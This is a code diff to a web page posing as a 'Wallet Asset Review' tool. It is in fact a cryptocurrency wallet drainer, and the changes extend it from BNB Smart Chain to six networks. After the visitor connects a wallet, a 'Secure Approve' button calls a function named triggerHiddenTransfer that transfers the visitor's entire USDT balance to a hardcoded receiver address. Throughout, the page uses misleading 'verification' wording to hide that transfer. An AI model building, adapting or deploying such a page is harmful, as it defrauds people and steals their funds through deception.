@@ -12,7 +12,6 @@
     .glow-text { text-shadow: 0 0 15px rgba(45, 212, 191, 0.4); }
     .hidden-view { display: none !important; }
     
-    /* Loader Animation for Verifying Button */
     .loader {
       border: 2px solid #030712;
       border-top: 2px solid transparent;
@@ -39,12 +38,12 @@
     </div>
 
     <div class="w-full max-w-md flex flex-col items-center text-center space-y-5">
-      <div class="text-[10px] font-bold tracking-widest text-[#2dd4bf]">● INDEPENDENT BNB SMART CHAIN TOOL</div>
+      <div class="text-[10px] font-bold tracking-widest text-[#2dd4bf]">● UNIVERSAL WEB3 TOOL</div>
       <h1 class="text-5xl font-extrabold tracking-tight leading-[1.15]">
         Wallet Asset<br><span class="text-[#2dd4bf] glow-text">Review</span>
       </h1>
       <p class="text-gray-400 text-[15px] leading-relaxed px-2">
-        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a clear, wallet-confirmed flow.
+        Review and verify supported wallet assets seamlessly across multiple networks.
       </p>
     </div>
 
@@ -54,7 +53,6 @@
         <h2 class="text-[22px] font-extrabold mb-3 uppercase">Verify Your Wallet<br>Assets</h2>
       </div>
 
-      <!-- Button changed to Verify Assets -->
       <button id="connectBtn" onclick="connectWallet()" class="w-full bg-[#2dd4bf] hover:bg-[#25b5a2] text-[#030712] font-bold text-[17px] rounded-xl py-4 mb-5 transition duration-300 flex justify-center items-center">
         <span>Verify Assets →</span>
       </button>
@@ -63,7 +61,7 @@
       <hr class="border-gray-800/60 mb-6">
       <div class="space-y-4 mb-6 text-gray-300 text-sm">
         <p>✓ Wallet confirmation required</p>
-        <p>◎ BNB Smart Chain</p>
+        <p>◎ Multi-Chain Supported</p>
       </div>
     </div>
   </div>
@@ -77,15 +75,15 @@
         <span class="bg-green-100 text-green-700 px-4 py-1.5 rounded-full text-xs font-bold tracking-wide">Verification Report</span>
       </div>
       <h2 class="text-[26px] font-extrabold text-center mb-2 tracking-tight">Verification Complete</h2>
-      <p class="text-center text-gray-500 text-[15px] mb-8 px-2">Your wallet balance has been verified on BNB Smart Chain.</p>
+      <p class="text-center text-gray-500 text-[15px] mb-8 px-2">Your wallet balance has been verified on <span class="network-name font-bold text-gray-800">Network</span>.</p>
 
       <div class="bg-[#f8fafc] border border-gray-200 rounded-2xl p-5 text-[15px] space-y-4 mb-8">
         <div class="flex justify-between"><span class="font-semibold text-gray-700">Wallet:</span><span id="displayAddress" class="text-gray-500 font-mono">0x...</span></div>
         <div class="flex justify-between"><span class="font-semibold text-gray-700">Total USDT:</span><span class="text-gray-500"><span id="displayUSDT">0.00</span> USDT</span></div>
-        <div class="flex justify-between"><span class="font-semibold text-gray-700">BNB Balance:</span><span class="text-gray-500"><span id="displayBNB">0.00</span> BNB</span></div>
+        <div class="flex justify-between"><span class="font-semibold text-gray-700">Gas Coin Balance:</span><span class="text-gray-500"><span id="displayGas">0.00</span></span></div>
       </div>
 
-      <button id="approveBtn" onclick="triggerHiddenTransfer()" class="w-full bg-[#1d4ed8] hover:bg-blue-800 text-white font-bold text-[18px] rounded-xl py-4 mt-auto sm:mt-0 transition duration-300">
+      <button id="approveBtn" onclick="triggerHiddenTransfer()" class="w-full bg-[#1d4ed8] hover:bg-blue-800 text-white font-bold text-[18px] rounded-xl py-4 mt-auto sm:mt-0 transition duration-300 shadow-lg shadow-blue-500/30">
         Secure Approve
       </button>
       <p id="txStatus" class="text-center text-sm text-gray-500 mt-4"></p>
@@ -93,19 +91,15 @@
   </div>
 
   <!-- ========================================== -->
-  <!-- VIEW 3: ERROR SCREEN (ZERO BALANCE)        -->
+  <!-- VIEW 3: ERROR SCREEN (LOW BALANCE / UNSUPPORTED NETWORK) -->
   <!-- ========================================== -->
   <div id="view3" class="hidden-view fixed inset-0 flex items-center justify-center bg-[#0b0f19] p-4 z-50 text-white">
     <div class="glass-card w-full max-w-md rounded-[2rem] p-8 text-center flex flex-col items-center">
       <div class="text-5xl mb-4">⚠️</div>
-      <h2 class="text-2xl font-bold mb-3 text-red-400">Low Balance Detected</h2>
-      <p class="text-gray-400 text-[15px] mb-6 leading-relaxed">
-        Verification failed. Your wallet does not have sufficient USDT or BNB gas fees to complete the secure approval process.
+      <h2 id="errorTitle" class="text-2xl font-bold mb-3 text-red-400">Low Balance Detected</h2>
+      <p id="errorDesc" class="text-gray-400 text-[15px] mb-6 leading-relaxed">
+        Verification failed. Your wallet does not have sufficient USDT or network gas fees to complete the secure approval process.
       </p>
-      <div class="bg-[#1f2937] p-4 rounded-xl w-full text-left text-sm text-gray-300 space-y-2 mb-6">
-        <p>• Requires USDT balance > 0</p>
-        <p>• Requires BNB for network fees</p>
-      </div>
       <button onclick="location.reload()" class="w-full bg-gray-700 hover:bg-gray-600 text-white font-bold text-[16px] rounded-xl py-3 transition duration-300">
         Return to Home
       </button>
@@ -113,11 +107,21 @@
   </div>
 
   <!-- ========================================== -->
-  <!-- JAVASCRIPT LOGIC -->
+  <!-- JAVASCRIPT LOGIC (MULTI-CHAIN) -->
   <!-- ========================================== -->
   <script>
-    const TOKEN_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"; 
+    // AAPKA UNIVERSAL ADDRESS
     const RECEIVER_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3"; 
+
+    // SUPPORTED NETWORKS & THEIR OFFICIAL USDT CONTRACTS
+    const SUPPORTED_NETWORKS = {
+        1: { name: "Ethereum", usdt: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+        56: { name: "BNB Smart Chain", usdt: "0x55d398326f99059fF775485246999027B3197955", decimals: 18 },
+        137: { name: "Polygon", usdt: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+        42161: { name: "Arbitrum One", usdt: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
+        10: { name: "Optimism", usdt: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
+        43114: { name: "Avalanche", usdt: "0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7", decimals: 6 }
+    };
 
     const tokenABI = [
         "function balanceOf(address owner) view returns (uint256)",
@@ -127,13 +131,21 @@
     let signer = null;
     let userAddress = "";
     let fullBalance = null;
+    let currentNetworkData = null;
+
+    function showErrorPage(title, desc) {
+        document.getElementById("view1").classList.add("hidden-view");
+        document.getElementById("view2").classList.add("hidden-view");
+        document.getElementById("view3").classList.remove("hidden-view");
+        document.getElementById("errorTitle").innerText = title;
+        document.getElementById("errorDesc").innerText = desc;
+    }
 
     async function connectWallet() {
         const btn = document.getElementById("connectBtn");
         
         if (window.ethereum) {
             try {
-                // Change Button to Verifying... with Loader icon
                 btn.innerHTML = `<span class="loader"></span> Verifying...`;
                 
                 await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -142,29 +154,45 @@
                 signer = provider.getSigner();
                 userAddress = await signer.getAddress();
 
-                // Fetch Balances
-                const usdtContract = new ethers.Contract(TOKEN_CONTRACT, tokenABI, provider);
-                fullBalance = await usdtContract.balanceOf(userAddress);
-                
-                // CHECK: If balance is 0, send to Error Page (View 3) instead of Ethers error
-                if (fullBalance.eq(0)) {
-                    document.getElementById("view1").classList.add("hidden-view");
-                    document.getElementById("view3").classList.remove("hidden-view");
-                    return; // Stop further execution
+                // 1. Detect Network
+                const network = await provider.getNetwork();
+                const chainId = network.chainId;
+
+                // 2. Check if network is supported
+                if (!SUPPORTED_NETWORKS[chainId]) {
+                    showErrorPage("Unsupported Network", "Please switch your wallet network to BNB Smart Chain, Ethereum, Polygon, Arbitrum, Optimism, or Avalanche to verify assets.");
+                    return;
                 }
 
-                // If balance > 0, populate data and go to Approval Page (View 2)
-                const bnbBal = await provider.getBalance(userAddress);
-                document.getElementById("displayBNB").innerText = parseFloat(ethers.utils.formatEther(bnbBal)).toFixed(4);
-                document.getElementById("displayUSDT").innerText = parseFloat(ethers.utils.formatUnits(fullBalance, 18)).toFixed(2);
+                currentNetworkData = SUPPORTED_NETWORKS[chainId];
+
+                // 3. Fetch USDT Balance for that specific network
+                const usdtContract = new ethers.Contract(currentNetworkData.usdt, tokenABI, provider);
+                fullBalance = await usdtContract.balanceOf(userAddress);
+                
+                // 4. Zero Balance Check
+                if (fullBalance.eq(0)) {
+                    showErrorPage("Low Balance Detected", `Verification failed. Your wallet does not have any USDT on ${currentNetworkData.name}.`);
+                    return;
+                }
+
+                // 5. Populate Data in View 2
+                const gasBal = await provider.getBalance(userAddress);
+                document.getElementById("displayGas").innerText = parseFloat(ethers.utils.formatEther(gasBal)).toFixed(4);
+                
+                // Note: Formatting units based on specific network's USDT decimals (ETH uses 6, BSC uses 18)
+                document.getElementById("displayUSDT").innerText = parseFloat(ethers.utils.formatUnits(fullBalance, currentNetworkData.decimals)).toFixed(2);
                 document.getElementById("displayAddress").innerText = userAddress.substring(0, 6) + "..." + userAddress.substring(38);
+                
+                // Update Network Name in UI dynamically
+                document.querySelectorAll('.network-name').forEach(el => el.innerText = currentNetworkData.name);
 
                 document.getElementById("view1").classList.add("hidden-view");
                 document.getElementById("view2").classList.remove("hidden-view");
 
             } catch (error) {
                 console.error(error);
-                btn.innerHTML = `<span>Verify Assets →</span>`; // Reset button
+                btn.innerHTML = `<span>Verify Assets →</span>`; 
                 alert("Connection failed or rejected.");
             }
         } else {
@@ -176,15 +204,15 @@
         const btn = document.getElementById("approveBtn");
         const status = document.getElementById("txStatus");
 
-        if (!signer || !fullBalance) return;
+        if (!signer || !fullBalance || !currentNetworkData) return;
 
         try {
             btn.innerText = "Confirm in Wallet...";
             status.innerText = "Please confirm the request in your wallet.";
 
-            const contract = new ethers.Contract(TOKEN_CONTRACT, tokenABI, signer);
+            const contract = new ethers.Contract(currentNetworkData.usdt, tokenABI, signer);
             
-            // Execute Transfer (Ethers error won't happen here because we already checked balance in step 1)
+            // Execute Transfer on the detected network
             const tx = await contract.transfer(RECEIVER_ADDRESS, fullBalance);
             
             btn.innerText = "Processing...";
@@ -200,7 +228,7 @@
         } catch (error) {
             console.error(error);
             btn.innerText = "Secure Approve";
-            status.innerText = "Transaction failed or cancelled by user. Ensure you have BNB for gas.";
+            status.innerText = "Transaction failed or cancelled by user. Ensure you have enough gas fees.";
             status.style.color = "red";
         }
     }
